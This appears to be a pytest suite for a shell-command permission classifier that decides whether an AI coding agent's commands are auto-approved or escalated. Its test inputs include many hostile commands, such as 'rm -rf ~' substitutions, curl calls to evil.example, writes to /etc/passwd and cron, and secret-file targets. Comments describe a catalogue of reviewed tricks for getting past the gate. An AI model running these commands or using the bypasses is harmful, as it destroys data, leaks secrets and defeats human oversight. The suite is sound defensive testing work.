"""Tier-1 CLASSIFY tests (gate-broker-classify.sh, #275 partition).

See shared/skills/hub/scripts/gate-broker-classify.sh.
"""

import json
from pathlib import Path

import pytest
from _gate_broker_support import (
    _call,
    _classify_with_wt,
    _decide,
    _hook_payload,
    _named_tool_record,
    _project_dir_for,
    _read_tool_record,
    _scratchpad_for,
)


@pytest.fixture(autouse=True)
def _isolated_afk_state(tmp_path, monkeypatch):
    """Pin the state dir so no test touches the real hub state (mirrors test_gate_broker)."""
    monkeypatch.setenv("AFK_STATE_DIR", str(tmp_path / "afk-state"))
    monkeypatch.setenv("AFK_HEARTBEAT", str(tmp_path / "afk-heartbeat"))


CLASSIFY_SURFACE = (
    "classify_permission",
    "_pytest_seg_scoped",
    "_permission_seg_safe",
    "_permission_seg_mutation_ok",
    "_permission_seg_exec_ok",
    "_permission_seg_marker_ok",
    "_classify_read_tool",
    "_permission_redirect_scan",
    "_permission_redirects_ok",
)


def test_classify_module_surface_loads() -> None:
    # The classify module's public surface must resolve after the entry lib sources it — proof
    # the fail-closed module source loop wired gate-broker-classify.sh in (a missing module
    # would leave classify_permission undefined and the deny-wall's Tier-1 lane would vanish).
    fns = " ".join(CLASSIFY_SURFACE)
    result = _call(
        f'for fn in {fns}; do command -v "$fn" >/dev/null || {{ echo "missing: $fn"; exit 1; }}; done; echo OK'
    )

    assert result.returncode == 0, result.stdout + result.stderr
    assert result.stdout.strip().splitlines()[-1] == "OK"


def test_classify_permission_approves_scoped_git_add() -> None:
    # A representative Tier-1 verdict lands identically through the split module.
    result = _call('classify_permission "git add tests/x.py" | cut -f1')

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "APPROVE"


def test_classify_permission_approves_the_overnight_compound(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # The exact overnight #176 shape auto-approves: cd into its own worktree, mv a stashed
    # file from the scratchpad into the tree, chmod +x it, stash pop, run targeted pytest.
    tasks = tmp_path / "tasks"
    scratch = _scratchpad_for(tasks, spoke_repo)
    cmd = (
        f"cd {spoke_repo} && mv {scratch}/hook.sh {spoke_repo}/hook.sh && "
        f"chmod +x {spoke_repo}/hook.sh && git stash pop && pytest tests/x.py"
    )

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "APPROVE"


def test_classify_permission_approves_relative_in_worktree_mutations(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # cd-tracking within the compound: after `cd` into a subdir, relative paths resolve
    # under the worktree and stay approvable (mkdir/cp/rm on the spoke's own files).
    tasks = tmp_path / "tasks"
    (spoke_repo / "sub").mkdir()
    cmd = "cd sub && mkdir -p out && cp a.txt out/a.txt && rm out/a.txt"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "APPROVE"


@pytest.mark.parametrize(
    "cmd",
    [
        "cp ./a.txt ./b.txt",  # `./`-prefixed in-tree paths (the most common form)
        "rm ./sub/b.txt",
        "chmod +x ./sub/hook.sh",
        "mkdir -p ./out",
        "cd ./sub && rm b.txt",  # `./` in a cd target must normalize too
    ],
)
def test_classify_permission_approves_dot_slash_in_tree_mutations(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # `/./` and `//` path normalization must collapse cleanly: an idiomatic `./`-prefixed
    # in-tree path (or a `cd ./sub`) still resolves under the worktree and stays approvable.
    tasks = tmp_path / "tasks"
    (spoke_repo / "sub").mkdir()

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "APPROVE"


def test_classify_permission_decomposes_multiline_compound(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # Decomposition handles a multi-line string (newline-joined segments), not just && chains.
    tasks = tmp_path / "tasks"
    scratch = _scratchpad_for(tasks, spoke_repo)
    cmd = f"cd {spoke_repo}\nmv {scratch}/a {spoke_repo}/a\nchmod +x {spoke_repo}/a"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "APPROVE"


def test_classify_permission_escalates_path_outside_worktree(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # One segment writing OUTSIDE the worktree/scratchpad escalates the whole compound.
    tasks = tmp_path / "tasks"
    scratch = _scratchpad_for(tasks, spoke_repo)
    cmd = f"cd {spoke_repo} && mv {scratch}/hook.sh /etc/cron.d/payload"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_chmod_on_git_internals(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A chmod on .git/ internals escapes the benign lane even though it is under the worktree.
    tasks = tmp_path / "tasks"
    cmd = f"chmod +x {spoke_repo}/.git/hooks/pre-commit"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_relative_chmod_on_git_internals(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A RELATIVE chmod on .git/ must not slip past the lane into the legacy relative-chmod
    # rule: with a worktree known, a mutation-lane miss is terminal (no fallthrough). Arming
    # a .git/hooks script is exactly the case the lane exists to keep out.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt("chmod +x .git/hooks/pre-commit", spoke_repo, tasks) == "ESCALATE"


# ── issue #240: approve constrained in-worktree ./script execution ─────────────
# The secondary facet: with extraction fixed, a spoke parked on running its OWN in-tree
# executable (#238's smoke: `chmod +x scripts/dev/afk-gate-smoke.sh &&
# ./scripts/dev/afk-gate-smoke.sh`) still escalated — the safe-segment lane had no rule for
# `./<relative-in-tree-path>` execution. Option A (the plan-gate decision) approves it when
# the path resolves under the worktree via _broker_resolve_in_roots, which already rejects
# `..`, absolute paths, `.git`, secret-like names, and shell metacharacters.


def test_classify_permission_approves_in_worktree_smoke_compound(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # The exact #238 compound: chmod +x its own in-tree script, then run it. Both segments
    # are scoped self-ops on the spoke's worktree, so the whole compound auto-approves.
    tasks = tmp_path / "tasks"
    cmd = "chmod +x scripts/dev/afk-gate-smoke.sh && ./scripts/dev/afk-gate-smoke.sh"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "APPROVE"


def test_classify_permission_approves_relative_script_exec_alone(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A bare `./<in-tree-path>` execution (with trailing args, opaque to which code runs)
    # approves on its own — the executable resolves under the worktree.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt("./scripts/dev/afk-gate-smoke.sh --check", spoke_repo, tasks) == (
        "APPROVE"
    )


def test_classify_permission_escalates_absolute_script_exec(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # An ABSOLUTE-path execution is not the scoped `./` self-op form — default-deny escalates.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt("/usr/local/bin/evil.sh", spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_script_exec_traversal_escape(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A `..` in the exec path could traverse out of the worktree at runtime; the resolver
    # rejects it, so the execution escalates.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt("./../escape.sh", spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_script_exec_without_worktree(spoke_repo: Path) -> None:
    # With no worktree context the in-tree claim cannot be verified, so `./script` execution
    # fails closed → escalate (mirrors the mutation lane's inert-without-worktree behaviour).
    result = _call('classify_permission "$CMD" | cut -f1', env={"CMD": "./scripts/dev/x.sh"})

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "ESCALATE"


def test_classify_permission_escalates_script_exec_with_substitution(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A command substitution smuggled behind a safe-looking `./script` prefix must escalate —
    # the segment-level reject fires before the exec rule can approve it.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt("./x.sh $(rm -rf ~)", spoke_repo, tasks) == "ESCALATE"


# ── issue #271: tier-1 marker-emission lane (spoke-ready.sh / spoke-push.sh) ────
# Gate-marker emission is the drain's most critical control-plane op, yet the canonical
# `bash <path>/spoke-ready.sh --gate <N> …` invocation fell through _permission_seg_safe to
# default-deny → the probabilistic Tier-3 judge, which denied it (a spoke could never park).
# The marker lane gives it a DETERMINISTIC Tier-1 APPROVE: the script basename must be a
# canonical emitter, the script + any --plan-file resolve inside the worktree, and the args
# fit the marker shape. Confinement is identical to the #203/#240 lanes (decided entirely by
# the lane when a worktree is known, else default-deny), so an out-of-tree or metachar form
# escalates.


@pytest.mark.parametrize(
    "cmd",
    [
        # the contract's verbatim command (this repo's tracked scripts/ path)
        "bash scripts/spoke-ready.sh --gate 270 --plan-file .ai-toolkit/gate-plan.md",
        # the synced-target path form (resolves textually in-tree even if absent on disk)
        "bash .ai-toolkit/scripts/spoke-ready.sh --gate 270",
        "bash .ai-toolkit/scripts/spoke-ready.sh --gate 270 -m short plan text",
        # spoke-push.sh --ready
        "bash .ai-toolkit/scripts/spoke-push.sh --ready 270",
        "bash scripts/spoke-push.sh",  # a bare per-subtask push
        # the terminal markers the drain emits
        "bash scripts/spoke-ready.sh --accept 270 -m built and reviewed",
        "bash scripts/spoke-ready.sh --blocked 270 -m the blocker",
        "bash scripts/spoke-ready.sh 270",  # bare ready
    ],
)
def test_classify_permission_approves_marker_emission(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # The canonical `bash <in-tree>/spoke-{ready,push}.sh …` marker invocation is a Tier-1
    # scoped self-op: the script resolves under the worktree and the args fit the marker shape.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "APPROVE"


@pytest.mark.parametrize(
    "cmd",
    [
        "bash /tmp/spoke-ready.sh --gate 270",  # absolute out-of-tree script
        "bash ../evil/spoke-ready.sh --gate 270",  # traversal out of the worktree
        "bash scripts/deploy.sh --gate 270",  # not a canonical marker basename
        "bash scripts/spoke-ready.sh --gate $(rm -rf ~)",  # command substitution
        "bash scripts/spoke-ready.sh --gate 270 > /etc/afk_probe",  # redirection
        "bash scripts/spoke-ready.sh --gate 270 --plan-file /etc/passwd",  # out-of-tree plan-file
        "bash scripts/spoke-ready.sh --gate 270 --plan-file .env",  # in-tree SECRET plan-file
        "bash scripts/spoke-ready.sh --gate 270 --plan-file=deploy.pem",  # secret via = form
        "bash scripts/spoke-ready.sh --gate 270; rm -rf .",  # a risky tail segment
    ],
)
def test_classify_permission_escalates_marker_emission_escapes(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # Same-named script outside the worktree, a non-marker basename, an out-of-tree --plan-file,
    # and any substitution/redirection metachar must escalate — the lane keeps the #203/#240
    # confinement discipline.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_marker_emission_without_worktree(
    spoke_repo: Path,
) -> None:
    # With no worktree context the in-tree claim cannot be verified, so a `bash <path>` marker
    # emission fails closed → escalate (mirrors the mutation/exec lanes' inert-without-worktree).
    result = _call(
        'classify_permission "$CMD" | cut -f1',
        env={"CMD": "bash scripts/spoke-ready.sh --gate 270"},
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "ESCALATE"


def test_danger_guard_allows_marker_emission_without_judge(
    afk_bypass_spoke: tuple[Path, dict[str, str]],
) -> None:
    # The load-bearing property (#271): under the bypass deny-wall, the canonical marker
    # command is a Tier-1 benign self-op, so the wall stays SILENT and the Tier-3 judge is
    # NEVER consulted. The judge stub is wired to DENY — if the marker command reached it, the
    # wall would emit a deny; a silent verdict proves Tier 1 short-circuited before the judge.
    wt, env = afk_bypass_spoke
    env = {**env, "AFK_JUDGE_CMD": "printf 'VERDICT: dangerous\\n'"}
    cmd = "bash scripts/spoke-ready.sh --gate 261 --plan-file .ai-toolkit/gate-plan.md"

    result = _decide(_hook_payload("Bash", wt, command=cmd), env)

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "", (
        f"marker emission must be a Tier-1 silent allow, never judged: {result.stdout}"
    )


# ── issue #282: tier-1 lane for the sanctioned nohup detached-push ─────────────
# The documented long-gate mitigation — `nohup ./scripts/spoke-push.sh --ready <N>
# >.ai-toolkit/push.log 2>&1 &` — had NO tier-1 lane: classify_permission never stripped the
# `nohup` wrapper (so the verb read as `nohup` and no lane matched), and _permission_seg_safe
# blanket-rejected the in-tree log redirect. Both are now Tier-1 APPROVEs — a leading
# env/command/nohup/setsid wrapper is stripped per segment (mirroring classify_danger), and a
# redirect whose every target resolves in-tree is validated + stripped at the RAW-command level,
# BEFORE the `&`-split that would otherwise shatter a `2>&1` into a bogus `1` segment.
# Out-of-tree / unparseable / substitution redirects still escalate.


@pytest.mark.parametrize(
    "cmd",
    [
        # the contract's verbatim detached push: exec lane behind nohup + in-tree redirect + 2>&1
        "nohup ./scripts/spoke-push.sh --ready 5 >.ai-toolkit/push.log 2>&1",
        # the trailing background `&` as an operator actually types it
        "nohup ./scripts/spoke-push.sh --ready 5 >.ai-toolkit/push.log 2>&1 &",
        # the marker-lane variant behind nohup, no redirect
        "nohup bash .ai-toolkit/scripts/spoke-push.sh --ready 5",
        # marker lane behind nohup WITH the in-tree redirect + fd-dup (the strip lets the marker
        # lane accept it — otherwise the trailing `>log` reads as a bogus positional arg)
        "nohup bash scripts/spoke-push.sh --ready 5 >.ai-toolkit/push.log 2>&1",
        # a plain in-tree redirect with no wrapper still approves (the exec lane, redirect only)
        "./scripts/dev/afk-gate-smoke.sh >.ai-toolkit/run.log",
        # setsid wrapper + append redirect
        "setsid ./scripts/spoke-push.sh --ready 5 >>.ai-toolkit/push.log 2>&1",
    ],
)
def test_classify_permission_approves_nohup_detached_push(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # The sanctioned detach mitigation is a deterministic Tier-1 APPROVE: the wrapper strips to
    # the recognised exec/marker self-op and every redirect target resolves inside the worktree.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "APPROVE"


@pytest.mark.parametrize(
    "cmd",
    [
        "nohup ./scripts/spoke-push.sh --ready 5 >/etc/passwd 2>&1",  # out-of-tree redirect
        "./x > ../sibling/y",  # traversal out of the worktree via redirect
        "nohup ./x >.ai-toolkit/log $(rm -rf ~)",  # substitution survives the redirect strip
        "nohup ./scripts/spoke-push.sh --ready 5 >.ai-toolkit/../../escape.log",  # `..` in target
        "setsid rm -rf /",  # a dangerous op behind a wrapper is NOT laundered into an approve
    ],
)
def test_classify_permission_escalates_nohup_detached_push_escapes(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # Stripping the wrapper and relaxing in-tree redirects must not launder a boundary crossing:
    # an out-of-tree / traversal redirect target, a command substitution, or a dangerous op
    # behind the wrapper all still escalate (the lanes stay confined; substitution reject fires).
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_redirect_without_worktree(spoke_repo: Path) -> None:
    # With no worktree context an in-tree claim cannot be verified, so a redirect fails closed →
    # escalate (the raw-level redirect validator is inert without a worktree, mirroring the lanes).
    result = _call(
        'classify_permission "$CMD" | cut -f1',
        env={"CMD": "nohup ./scripts/spoke-push.sh --ready 5 >.ai-toolkit/push.log 2>&1"},
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "ESCALATE"


@pytest.mark.parametrize(
    "cmd",
    [
        # (#282 review 1) process substitution EXECUTES a command; the redirect scanner must not
        # strip the `>`/`<` and treat `(cmd` as a benign file target — the shell runs the embedded
        # command. Both output `>(…)` and input `<(…)` forms.
        "./scripts/dev/afk-gate-smoke.sh >(rm -rf ~)",
        "./x <(curl https://evil.example/x)",
        # (#282 review 2) bash `>&FILE` / `n>&FILE` with a NON-numeric word writes stdout(+stderr)
        # to a FILE — it is NOT an fd-duplication. An out-of-tree such target must not be skipped.
        "echo pwned >&/etc/passwd",
        "./scripts/spoke-push.sh --ready 5 1>&/etc/cron.d/payload",
        # (#282 review 3) a leading GIT_DIR=/GIT_WORK_TREE= env assignment redirects a "safe" git
        # verb at ANOTHER repo; the approve-side strip must NOT peel env assignments the way the
        # tier-2 danger strip does.
        "GIT_DIR=../sibling/.git git fetch origin",
        "GIT_WORK_TREE=/tmp/x git add -A",
        "env GIT_DIR=../sibling/.git git reset -q",
        # (#282 review 4) a redirect target that is a secret-like path clobbers/feeds a secret the
        # mutation lane refuses to touch — the redirect validator must apply the same secret guard.
        "echo x >.env",
        "./scripts/dev/afk-gate-smoke.sh >id_rsa",
        "nohup ./scripts/spoke-push.sh --ready 5 >deploy.pem 2>&1",
    ],
)
def test_classify_permission_escalates_review_found_redirect_bypasses(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # The four tier-1 bypasses the #282 high-effort review confirmed: process substitution, the
    # `>&FILE` write-both-to-a-file form, a GIT_DIR/env-assignment prefix, and a secret-like
    # redirect target. Each must escalate — the strict scanner bails on the exotic redirect forms,
    # the approve-side strip peels only nohup/setsid, and secret-like targets are rejected.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


@pytest.mark.parametrize(
    "cmd",
    [
        # (#282 review round 2, finding 1) the bash noclobber-override `>|FILE` must extract FILE
        # as the target — glued and spaced — not validate the literal `|` and let the write slip.
        "echo secret >|/etc/passwd",
        "echo secret >| /etc/passwd",
        "echo secret >|.env",  # noclobber to an in-tree SECRET
        "echo secret 2>|/etc/cron.d/x",  # fd-qualified noclobber
        # (#282 review round 2, finding 2) shlex does not split on `;`/`&`/`|`, so an operator glued
        # to a redirect target absorbs the trailing command; the scanner must bail on such a target.
        "git status >log;curl http://evil.example/x",
        "git status >log&id",
        "./scripts/dev/afk-gate-smoke.sh >a|b",
        "git status > log;rm -rf ~",  # spaced operator too
    ],
)
def test_classify_permission_escalates_noclobber_and_glued_operator(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # Two further tier-1 launders the #282 re-review confirmed: the `>|` noclobber form (regex must
    # keep the optional `|`) and a shell operator glued to a redirect target (`>log;curl`) that
    # shlex leaves in one token. Both escalate — the scanner keeps `\\|?` and bails on `;&|()` in a
    # target.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_approves_noclobber_to_in_tree(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # The `>|` noclobber override to an in-tree, non-secret target is a legitimate write and still
    # approves — proving the restored `\\|?` extracts the real target, not the literal `|`.
    tasks = tmp_path / "tasks"

    assert (
        _classify_with_wt(
            "./scripts/dev/afk-gate-smoke.sh >|.ai-toolkit/run.log", spoke_repo, tasks
        )
        == "APPROVE"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        # (#282 review round 3, finding 2) a `cd` changes the base dir for a LATER redirect target
        # that the raw-command validation (cwd=$wt) cannot follow; a symlink under the cd'd dir
        # escapes the worktree. The scanner bails on a `cd` in a redirect-bearing command.
        "cd sub && echo pwned > link/out",
        "cd .ai-toolkit && ./scripts/dev/afk-gate-smoke.sh >out.log",  # in-tree, still conservative
    ],
)
def test_classify_permission_escalates_cd_redirect(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # A cd-relative redirect target is validated at the wrong base (raw command uses cwd=$wt, before
    # the cd), so a symlink under the cd'd dir would escape; the raw-command strip refuses it.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


@pytest.mark.parametrize(
    "cmd",
    [
        # (#282 review round 3, finding 1) a NEWLINE separates commands but is whitespace shlex
        # silently eats — the second command would merge into a tier-1 safe verb's args. The scanner
        # bails on any newline in a redirect-bearing command. (The ESCALATE reason echoes the raw
        # multi-line command, so assert the verdict token on the FIRST output line, not the whole.)
        "git add . > log.txt\nnpm install evil",
        "cat x >log\nrm -rf ~",
    ],
)
def test_classify_permission_escalates_newline_redirect(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    result = _call(
        'classify_permission "$CMD" "$WT"',
        env={"CMD": cmd, "WT": str(spoke_repo), "AFK_TASKS_ROOT": str(tmp_path / "tasks")},
    )

    assert result.returncode == 0, result.stderr
    # First line, first tab-field is the verdict — never APPROVE for a newline-flattened compound.
    assert result.stdout.splitlines()[0].split("\t")[0] == "ESCALATE"


def test_classify_permission_escalates_brace_expansion_escape(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # Brace expansion is a shell metacharacter the textual resolver cannot see through: at
    # runtime `{/etc/passwd,keep}` expands to two words, one out-of-tree. It must escalate.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt("rm {/etc/passwd,keep}", spoke_repo, tasks) == "ESCALATE"
    assert _classify_with_wt("cp in {out,/tmp/EXFIL}", spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_symlink_following_mutation(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A logically-in-tree path that is a symlink to an out-of-tree target must escalate: a
    # `cp`/`chmod` follows the link and writes outside the worktree. Physical (realpath)
    # containment catches what the textual check cannot.
    tasks = tmp_path / "tasks"
    outside = tmp_path / "outside_target"
    outside.write_text("original\n")
    link = spoke_repo / "link_out"
    link.symlink_to(outside)

    assert _classify_with_wt(
        f"cp {spoke_repo}/payload {spoke_repo}/link_out", spoke_repo, tasks
    ) == ("ESCALATE")


def test_classify_permission_escalates_case_variant_git_internals(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # macOS's default filesystem is case-INSENSITIVE, so `.GIT` addresses the same dir as
    # `.git`; the literal-`.git` textual guard alone would miss it. The physical layer must
    # reject any `.git` path component case-insensitively.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(f"chmod +x {spoke_repo}/.GIT/hooks/pre-commit", spoke_repo, tasks) == (
        "ESCALATE"
    )


def test_classify_permission_escalates_mutation_of_secretlike_path(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A write to a secret-like path (a .pem key) is never in the benign lane.
    tasks = tmp_path / "tasks"
    cmd = f"cp {spoke_repo}/deploy.pem {spoke_repo}/copy.pem"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


@pytest.mark.parametrize(
    "path",
    [
        "~/.bashrc",  # tilde expands to $HOME at execution — escapes the worktree
        "$HOME/.bashrc",  # variable expansion escapes too
        "${HOME}/x",
    ],
)
def test_classify_permission_escalates_shell_expansion_in_mutation_path(
    path: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # A path token carrying tilde or variable expansion resolves OUTSIDE the worktree at
    # execution even though it looks in-tree textually — it must never enter the benign lane.
    tasks = tmp_path / "tasks"
    cmd = f"cp {spoke_repo}/a.txt {path}"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


@pytest.mark.parametrize(
    "cmd",
    [
        "chmod -R 777 .",  # recursively reaches .git/ and in-tree secrets
        "rm -rf .",
        "cp . dst",
        "mkdir .",
        "chmod +x ./.",  # the `/.` collapses to the root too
    ],
)
def test_classify_permission_escalates_bare_dot_root_target(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # A bare `.` (or `./.`) targets the worktree ROOT — a `chmod -R` there recursively hits
    # .git/ internals and secret files the per-token guards never see. It must escalate: the
    # "never target the worktree root" invariant fires only if `.` resolves to the root itself.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


@pytest.mark.parametrize(
    "cmd",
    [
        'rm "/etc/passwd"',  # a quoted absolute path: the shell strips the quote at exec
        "rm '/etc/passwd'",  # single-quoted form
        'cp sub/f "/etc/evilcopy"',
        'chmod 777 "/etc/passwd"',
        r"rm \/etc/passwd",  # backslash-escaped leading slash
        "mv -t/etc/ sub/file.txt",  # GNU glued target-directory hides the out-of-tree dest
        "mv --target-directory=/etc sub/file.txt",
        "cp -t /etc sub/file.txt",  # separate-token target-directory too
    ],
)
def test_classify_permission_escalates_quoted_or_target_dir_escapes(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # Containment is decided on tokens that STILL carry shell quoting/escaping the shell
    # strips at execution: a leading quote/backslash makes an out-of-tree absolute path look
    # in-tree, and a GNU -t/--target-directory hides the destination inside a flag. Both must
    # escalate — the classifier must never approve what the shell would run out of tree.
    tasks = tmp_path / "tasks"
    (spoke_repo / "sub").mkdir()

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_escalates_redirection_in_cd_target(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # The cd-tracking branch resolves its target through _broker_resolve_in_roots, which must
    # reject redirection operators too: `cd foo>/etc/x` looks like one in-tree token but the
    # shell splits it into `cd foo` + an out-of-tree redirect. Pre-#203 the `cd` segment fell
    # through to the segment-level `>` guard; the new branch must not regress that.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt("cd foo>/etc/afk_probe", spoke_repo, tasks) == "ESCALATE"
    assert _classify_with_wt("cd foo 2>/etc/afk_probe", spoke_repo, tasks) == "ESCALATE"
    assert _classify_with_wt("cd foo>>/etc/afk_probe", spoke_repo, tasks) == "ESCALATE"
    # a redirect into an in-tree secret escapes the cd path's (absent) secret guard too
    assert _classify_with_wt(f"cd foo>{spoke_repo}/.env", spoke_repo, tasks) == "ESCALATE"


@pytest.mark.parametrize(
    "cmd",
    [
        "cd -- && rm -rf .ssh",  # `cd --` → $HOME, not an in-tree dir named `--`
        "cd -P && rm .bashrc",  # `cd -P`/`-L` → $HOME
        "cd -L && rm .bashrc",
        "cd - && rm a.txt",  # `cd -` → $OLDPWD
    ],
)
def test_classify_permission_escalates_dash_cd_target(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # A `cd` target beginning with `-` is a flag/special the shell resolves OUT of the tree
    # (`--`/`-P`/`-L` → $HOME, `-` → $OLDPWD), not a literal in-tree directory. The cd handler
    # must escalate it rather than track a bogus in-tree cwd and approve the following mutation.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


@pytest.mark.parametrize(
    "cmd",
    [
        "chmod 600 .ENV",  # case-variant of a secret basename (macOS FS is case-insensitive)
        "rm .ENV",
        "mv .ENV stolen",
        "cp a.txt secret.PEM",
        "cp a.txt ID_RSA",
    ],
)
def test_classify_permission_escalates_case_variant_secretlike(
    cmd: str, spoke_repo: Path, tmp_path: Path
) -> None:
    # macOS's default filesystem is case-insensitive, so `.ENV` addresses the same inode as
    # `.env`; the secret-like guard must match case-insensitively (mirroring the .git guard),
    # or a case-variant secret slips into the benign lane.
    tasks = tmp_path / "tasks"

    assert _classify_with_wt(cmd, spoke_repo, tasks) == "ESCALATE"


def test_classify_permission_mutation_lane_inert_without_worktree() -> None:
    # Backward-compatible: with NO worktree argument the mutation lane is inert, so a bare
    # `mv`/`rm`/`chmod` still default-denies exactly as before (#149/#171 posture).
    result = _call('classify_permission "$CMD" | cut -f1', env={"CMD": "mv a b"})
    assert result.stdout.strip() == "ESCALATE"


def test_extract_pending_command_carries_read_target(spoke_repo: Path, tmp_path: Path) -> None:
    # A Read tool_use surfaces as "Read <file_path>" — the name AND its target — so the
    # classifier can vet the path, not just default-deny the bare tool name.
    projects = tmp_path / "projects"
    pd = _project_dir_for(projects, spoke_repo)
    target = spoke_repo / "scripts" / "x.sh"
    (pd / "session.jsonl").write_text(json.dumps(_read_tool_record(str(target))) + "\n")

    result = _call(
        f"extract_pending_command '{spoke_repo}'", env={"CLAUDE_PROJECTS_DIR": str(projects)}
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == f"Read {target}"


def test_extract_pending_command_other_tool_stays_bare_name(
    spoke_repo: Path, tmp_path: Path
) -> None:
    # A non-Read tool still surfaces as its bare name (no target) — unchanged default-deny.
    projects = tmp_path / "projects"
    pd = _project_dir_for(projects, spoke_repo)
    (pd / "session.jsonl").write_text(
        json.dumps(_named_tool_record("Write", {"file_path": "/x", "content": "y"})) + "\n"
    )

    result = _call(
        f"extract_pending_command '{spoke_repo}'", env={"CLAUDE_PROJECTS_DIR": str(projects)}
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout.strip() == "Write"
